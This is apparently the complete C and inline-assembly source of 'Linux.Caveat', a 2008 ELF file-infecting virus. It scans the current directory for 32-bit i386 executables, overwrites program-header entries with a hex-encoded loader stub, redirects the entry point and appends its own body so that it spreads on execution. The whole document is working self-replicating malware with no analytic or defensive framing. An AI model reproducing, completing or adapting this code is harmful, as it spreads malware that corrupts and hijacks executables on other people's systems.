   /* Linux.Caveat (x) herm1t@vx.netlux.org, feb 2008 */
   #include <stdint.h>
   #include <elf.h>
   #include <sys/mman.h>
   #include <asm/unistd.h>

   asm("fake_host: mov $1,%eax; sub %ebx,%ebx; int $0x80;");
   asm(".globl _start");
   asm("_start: add $40,%esp; call caveat; popa; push $fake_host; ret");

   #define NULL        ((void*)0)
   #define ASM     asm volatile
   #define _SC(r,NR)   "push %1\npop %%eax\nint $0x80":"=a"(r):"i"(NR)
   #define syscall0(NR)            \
   ({int r;ASM(_SC(r,NR));r; })
   #define syscall1(NR,a)          \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)));r;})
   #define syscall2(NR,a,b)        \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)));r;})
   #define syscall3(NR,a,b,c)      \
   ({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)));r;})
   #define syscall6(NR,a,b,c,d,e,f)    \
   ({int r;ASM("push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp"  \
           :"=a"(r):"i"(NR),"b"((int)(a)), \
       "c"((int)(b)),"d"((int)(c)),"S"((int)(d)),"D"((int)(e)),"0"((int)(f)));r;})
   #define exit(a)                 syscall1(1,  a)
   #define read(a,b,c)             syscall3(3,  a,b,c)
   #define write(a,b,c)            syscall3(4,  a,b,c)
   #define open(a,b)               syscall2(5,  a,b)
   #define close(a)                syscall1(6,  a)
   #define creat(a,b)              syscall2(8,  a,b)
   #define time(a)                 syscall1(13, a)
   #define lseek(a,b,c)            syscall3(19, a,b,c)
   #define rename(a,b)             syscall2(38, a,b)
   #define readdir(a,b)            syscall2(89, a,b)
   #define munmap(a,b)             syscall2(91, a,b)
   #define ftruncate(a,b)          syscall2(93, a,b)
   #define mprotect(a,b,c)         syscall3(125,a,b,c)
   #define mmap(a,b,c,d,e,f)       syscall6(192,a,b,c,d,e,f)

   static void inline memcpy(void *dst, void *src, int len)
   {
       int i;
       for (i = 0; i < len; i++)
           *(char*)dst++ = *(char*)src++;
   }

   static void infect(char *filename, char *self)
   {
       char loader[60];
       int h, l, i, ok, size;
       uint8_t *m;
       uint32_t old_entry, off, base;
       Elf32_Ehdr *ehdr;
       Elf32_Phdr *phdr;

       ok = base = 0;
       *(unsigned int*)(loader + 0x00) = 0x65786860;
       *(unsigned int*)(loader + 0x04) = 0x6c680000;
       *(unsigned int*)(loader + 0x08) = 0x68652f66;
       *(unsigned int*)(loader + 0x0c) = 0x65732f63;
       *(unsigned int*)(loader + 0x10) = 0x72702f68;
       *(unsigned int*)(loader + 0x14) = 0x29e3896f;
       *(unsigned int*)(loader + 0x18) = 0xe9056ac9;
       *(unsigned int*)(loader + 0x1c) = 0;
   #define LOADER_JMP  28
       *(unsigned int*)(loader + 0x20) = 0x6880cd58;
       *(unsigned int*)(loader + 0x24) = 0;
   #define LOADER_OFF  36
       *(unsigned int*)(loader + 0x28) = 0x6a016a50;
       *(unsigned int*)(loader + 0x2c) = 0x10006805;
       *(unsigned int*)(loader + 0x30) = 0x89510000;
       *(unsigned int*)(loader + 0x34) = 0x585a6ae3;
       *(unsigned int*)(loader + 0x38) = 0xe0ff80cd;
   extern int _start;
   extern int virus_end;
       size = (char*)&virus_end - (char*)&_start;

       if ((h = open(filename, 2)) < 0)
           return;
       if ((l = lseek(h, 0, 2)) < 0)
           goto error1;
       m = (char*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
       if ((uint32_t)m > 0xfffff000)
           goto error1;

       ehdr = (Elf32_Ehdr*)m;
       phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
       if (*(uint32_t*)ehdr->e_ident != 0x464c457f ||
           ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
           ehdr->e_version != EV_CURRENT || ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE) {
   error2:     munmap(m, l);
   error1:     close(h);
           return;
       }
       off = (l + 4095) & 0xfffff000;
       *(uint32_t*)(loader + LOADER_OFF) = off;
       old_entry = ehdr->e_entry;
   #ifdef  PARTS
       /* replace the PT_NOTE (in PHT) and .note.ABI-tag with loader */
       uint32_t note;
       for (i = 0; i < ehdr->e_phnum; i++) {
           if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
               base = phdr[i].p_vaddr;
           if (base && phdr[i].p_type == PT_NOTE) {
               note = phdr[i].p_offset;
               if (i != ehdr->e_phnum - 1)
                   memcpy(&phdr[i], &phdr[i + 1], sizeof(Elf32_Phdr) * (ehdr->e_phnum - i - 1));
               ehdr->e_phnum--;
               *(uint32_t*)(loader + LOADER_JMP) = note - (ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum + 32);
               memcpy(&phdr[ehdr->e_phnum], loader, 32);
               memcpy(m + note, loader + 32, 28);
               ehdr->e_entry = base + ((char*)&phdr[ehdr->e_phnum] - (char*)m);
               ok++;
           }
       }
   #else
       /* replace PT_PHDR/PT_GNU_STACK/PT_NOTE with loader */
       Elf32_Phdr new_phdr[ehdr->e_phnum];
       int new_phnum = 0;
       for (i = 0; i < ehdr->e_phnum; i++) {
           if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0)
               base = phdr[i].p_vaddr;
           if (phdr[i].p_type == PT_NOTE || phdr[i].p_type == PT_PHDR || phdr[i].p_type == PT_GNU_STACK)
               continue;
           memcpy(&new_phdr[new_phnum++], &phdr[i], sizeof(Elf32_Phdr));
       }
       if (base && ehdr->e_phnum - new_phnum > 1) {
           ehdr->e_phnum = new_phnum;
           memcpy(phdr, new_phdr, new_phnum * sizeof(Elf32_Phdr));
           memcpy(&phdr[new_phnum], loader, sizeof(loader));
           ehdr->e_entry = base + ((char*)&phdr[new_phnum] - (char*)m);
           ok++;
       }
   #endif
       if (ok) {
           ftruncate(h, off);
           lseek(h, 0, 2);
           write(h, self, size);
           lseek(h, off + 10, 0);
           write(h, &old_entry, 4);
       }
       goto error2;
   }

   static void __attribute__((used)) caveat(void)
   {
       char dot[] = { '.', '\0' };
       char d[256];
       int h;
       char *self = __builtin_return_address(0) - 8;
       if ((h = open(dot, 0)) > 0)
           while (readdir(h, d) > 0)
               infect(d + 10, self);
       close(h);

   }

   asm("virus_end:");
